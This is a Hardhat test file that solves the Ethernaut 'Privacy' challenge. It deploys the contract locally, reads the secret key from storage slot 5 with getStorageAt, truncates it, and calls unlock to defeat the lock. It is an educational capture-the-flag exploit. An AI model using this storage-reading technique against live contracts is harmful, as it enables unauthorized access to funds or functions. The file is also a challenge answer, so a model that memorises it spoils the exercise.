const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { utils } = require("ethers");

describe("Ethernaut - Twelve", function () {
  async function deployToken() {
    const [deployer] = await ethers.getSigners();

    const EthernautTwelvePrivacy = await ethers.getContractFactory(
      "EthernautTwelvePrivacy"
    );
    const ethernautTwelvePrivacy = await EthernautTwelvePrivacy.deploy([
      utils.formatBytes32String("haha"),
      utils.formatBytes32String("hehe"),
      utils.formatBytes32String("key"),
    ]);
    await ethernautTwelvePrivacy.deployed();

    return { deployer, ethernautTwelvePrivacy };
  }

  describe("Exploit", function () {
    it("Can unlock contract", async function () {
      const { ethernautTwelvePrivacy } = await loadFixture(deployToken);

      expect(await ethernautTwelvePrivacy.locked()).to.equal(true);

      const key = (
        await ethers.provider.getStorageAt(ethernautTwelvePrivacy.address, 5)
      ).slice(0, 34);
      await ethernautTwelvePrivacy.unlock(key);

      expect(await ethernautTwelvePrivacy.locked()).to.equal(false);
    });
  });
});
